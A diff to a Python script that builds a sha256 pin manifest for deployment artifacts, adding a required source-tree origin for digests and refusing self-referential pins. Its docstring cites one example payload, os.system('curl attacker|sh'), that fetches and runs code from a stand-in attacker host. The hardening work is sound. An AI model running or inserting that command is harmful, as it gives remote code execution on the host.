@@ -24,6 +24,36 @@ it is pinned under each of them rather than a stand-in being invented:
 Run AFTER everything exists (the lease and the sudoers allowlist are written late), and BEFORE the
 services start — the pin is a start-time measurement, so anything provisioned after it is not
 covered by it.
+
+WHERE THE DIGESTS COME FROM, AND WHAT THAT DOES NOT PROVE
+---------------------------------------------------------
+A content pin is only as good as the ORIGIN of the number it pins. This script used to compute every
+`expected_sha256` by hashing the very file it was pinning, in the same root shell that had just
+installed that file, seconds earlier. The manifest is the sole input to the later §2.5 check, so the
+check could only ever compare the tree against itself: substituting an artifact BEFORE the pin was
+taken produced a manifest that pinned the substituted bytes and a floor that verified happily. Driven
+against this builder, a `run_supervisor.py` replaced with ``os.system('curl attacker|sh')`` was pinned
+at its own digest and the manifest carried no field that even named where the number came from.
+
+So the digests are now split, and the split is RECORDED in the manifest (`digest_origin` per artifact,
+`digest_origin_counts` at the top level):
+
+  * **``source:<relative path>``** — the artifact was copied verbatim out of the repository tree the
+    kit was staged from, so its digest is taken from THE SOURCE, which is not the deployment tree.
+    The installed copy is then compared against it and a difference REFUSES the build: that is the
+    install step being caught substituting bytes, which is what a content pin is for. `--source-dir`
+    is required precisely so this cannot silently degrade to self-measurement.
+  * **``deployment-measured``** — the artifact does not exist anywhere but this host: the compiled
+    binaries (built here), the provisioned lease/root-anchor/recorder-policy/config, the generated
+    sudoers allowlist. Their digests are self-measured and CANNOT detect a provisioner that was
+    already compromised when it wrote them. They still detect any change between the pin and the
+    check, which is a real property, but it is not integrity of origin, and the manifest now says so
+    rather than presenting both halves as the same kind of fact.
+
+Closing the second half needs an origin outside this host entirely (release-signed binary digests, or
+an operator signature over the manifest). That is an Owner/Architect decision, not something this
+script can invent; what it can do is refuse to pretend, which is why a manifest with NO independent
+digest at all is refused outright.
 """
 
 from __future__ import annotations
@@ -33,6 +63,21 @@ import hashlib
 import json
 import os
 import sys
+
+#: logical_name -> path, RELATIVE TO THE SOURCE TREE, for each pinned artifact that the kit copies
+#: verbatim out of the repository. These are the only entries whose digest has an origin other than
+#: the deployment tree being measured. Everything absent from this map is compiled or provisioned on
+#: the deployment host and is `deployment-measured` — see the module docstring.
+SOURCE_ORIGIN = {
+    "supervisor.bin": "engine/ci/live/run_supervisor.py",
+    "isolated-signer.bin": "engine/ci/live/run_signer.py",
+    "desktop-challenge-authority.bin": "engine/ci/live/run_authority.py",
+    # Both `.unit` roles pin a root-owned copy of the orchestrator script, which is a repo file.
+    "trusted-verifier-broker.unit": "engine/ci/live/run_live_turn.sh",
+    "desktop-challenge-authority.unit": "engine/ci/live/run_live_turn.sh",
+}
+
+DEPLOYMENT_MEASURED = "deployment-measured"
 
 
 def sha256_file(path: str) -> str:
@@ -49,6 +94,10 @@ def main() -> int:
     ap.add_argument("--sudoers", required=True, help="the governed-execution allowlist source")
     ap.add_argument("--unit", required=True, help="root-owned copy of the orchestrator script")
     ap.add_argument("--out", required=True, help="where to write the manifest JSON")
+    ap.add_argument(
+        "--source-dir", required=True,
+        help="the repository tree the kit was staged FROM. Required, not optional: it is the only "
+             "origin for a pinned digest that is not the deployment tree the pin is checked against")
     args = ap.parse_args()
 
     root = os.path.abspath(args.root_dir)
@@ -100,25 +149,77 @@ def main() -> int:
         "desktop-challenge-authority.unit": os.path.abspath(args.unit),
     }
 
+    source = os.path.abspath(args.source_dir)
+    if not os.path.isdir(source):
+        print("FAIL: --source-dir %s is not a directory" % source, file=sys.stderr)
+        return 1
+
     artifacts = []
+    independent = 0
     for logical_name, path in sorted(mapping.items()):
         if not os.path.isfile(path):
             print("FAIL: %s is missing for %s" % (path, logical_name), file=sys.stderr)
             return 1
+        installed = sha256_file(path)
+
+        relative = SOURCE_ORIGIN.get(logical_name)
+        if relative is None:
+            # Compiled or provisioned on this host: there is nowhere else the bytes exist, so the
+            # digest is self-measured and the manifest says so instead of implying otherwise.
+            origin, expected = DEPLOYMENT_MEASURED, installed
+        else:
+            origin_path = os.path.join(source, *relative.split("/"))
+            if not os.path.isfile(origin_path):
+                print("FAIL: %s claims a source origin at %s, which is not there. A pin whose "
+                      "origin is missing must not silently fall back to hashing the deployment "
+                      "copy — that is the self-referential pin this argument exists to close."
+                      % (logical_name, origin_path), file=sys.stderr)
+                return 1
+            expected = sha256_file(origin_path)
+            if expected != installed:
+                print("FAIL: %s at %s is sha256 %s, but the source it was staged from (%s) is %s. "
+                      "The install step changed the bytes; refusing to pin what was installed "
+                      "rather than what was authorized." % (logical_name, path, installed,
+                                                            origin_path, expected),
+                      file=sys.stderr)
+                return 1
+            origin = "source:" + relative
+            independent += 1
+
         artifacts.append({
             "logical_name": logical_name,
             "path": path,
-            "expected_sha256": sha256_file(path),
+            "expected_sha256": expected,
             # This kit has no separate brops-admin principal: root owns every TCB artifact, and the
             # manifest says so rather than naming an owner that does not exist here.
             "expected_owner": "root",
+            # Not consumed by `verify_tcb_integrity` (serde ignores it). It is here so an auditor
+            # reading the manifest can tell which pins have an origin outside the tree they police
+            # and which are the tree measuring itself.
+            "digest_origin": origin,
         })
 
-    manifest = {"artifacts": artifacts, "owner_uids": {"root": 0, "brops_admin": 0}}
+    if independent == 0:
+        print("FAIL: not one pinned digest has an origin outside the tree it measures. A manifest "
+              "built entirely by hashing the files it pins cannot fail a content check, and "
+              "presenting it as a §2.5 content pin is the defect, not the floor.", file=sys.stderr)
+        return 1
+
+    manifest = {
+        "artifacts": artifacts,
+        "owner_uids": {"root": 0, "brops_admin": 0},
+        "digest_origin_counts": {
+            "source": independent,
+            DEPLOYMENT_MEASURED: len(artifacts) - independent,
+        },
+    }
     with open(args.out, "w", encoding="utf-8") as f:
         json.dump(manifest, f, separators=(",", ":"))
     os.chmod(args.out, 0o644)
     print("tcb pin manifest: %d artifacts -> %s" % (len(artifacts), args.out))
+    print("  digest origin: %d from the source tree %s, %d self-measured on this host "
+          "(compiled or provisioned here — these cannot detect a compromised provisioner)"
+          % (independent, source, len(artifacts) - independent))
     return 0
 
 
